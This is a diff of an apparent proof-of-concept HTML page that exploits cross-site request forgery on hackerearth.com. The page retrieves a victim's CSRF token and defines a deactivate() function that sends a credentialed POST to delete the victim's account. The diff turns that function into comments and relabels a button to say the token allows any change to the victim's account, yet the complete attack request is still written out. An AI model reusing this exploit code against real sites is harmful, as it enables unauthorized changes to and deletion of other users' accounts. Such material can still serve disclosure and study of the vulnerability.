@@ -8,10 +8,8 @@
   <div id="demo1"></div>
   <div id="demo2"></div>
   <div id="demo3"></div>
-<button type="button" onclick="get_csrf_token()">Get csrf to deactivate victim account!!!</button>
+<button type="button" onclick="get_csrf_token()">You can get any csrf token and make changes in victim account!!!</button>
   <div id="demo4"></div>
-<button type="button" onclick="deactivate()">Now deactivate victim account!!!</button>
-  <div id="demo5"></div>
 </div>
 
 <script>
@@ -51,22 +49,22 @@ function get_csrf_token(){
   xhttp.send();
 }
   
-function deactivate(){
-  var xhttp = new XMLHttpRequest();
-    xhttp.onreadystatechange = function() {
-    if (this.readyState == 4 && this.status == 200) {
-          document.getElementById("demo5").innerHTML = xhttp.responseText;
-    }
-  };
-  var username = document.getElementById("demo3").innerText;
-  var csrf = document.getElementById("demo4").innerText;
-  var param  = "csrfmiddlewaretoken=" + csrf.replace("csrf for deactivate account : ","") + "&deactivate_reason=1&deactivate_other_message=&deactivate_consent=on&submit=Deactivate+my+account"
-  var url = "https://www.hackerearth.com/deactivate/" + username.replace("Username: ","") + "/";
-  xhttp.open("POST", url, true);
-  xhttp.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
-  xhttp.withCredentials = true;
-  xhttp.send(param);
-}
+// function deactivate(){
+//   var xhttp = new XMLHttpRequest();
+//     xhttp.onreadystatechange = function() {
+//     if (this.readyState == 4 && this.status == 200) {
+//           document.getElementById("demo5").innerHTML = xhttp.responseText;
+//     }
+//   };
+//   var username = document.getElementById("demo3").innerText;
+//   var csrf = document.getElementById("demo4").innerText;
+//   var param  = "csrfmiddlewaretoken=" + csrf.replace("csrf for deactivate account : ","") + "&deactivate_reason=1&deactivate_other_message=&deactivate_consent=on&submit=Deactivate+my+account"
+//   var url = "https://www.hackerearth.com/deactivate/" + username.replace("Username: ","") + "/";
+//   xhttp.open("POST", url, true);
+//   xhttp.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+//   xhttp.withCredentials = true;
+//   xhttp.send(param);
+// }
   
 </script>
 
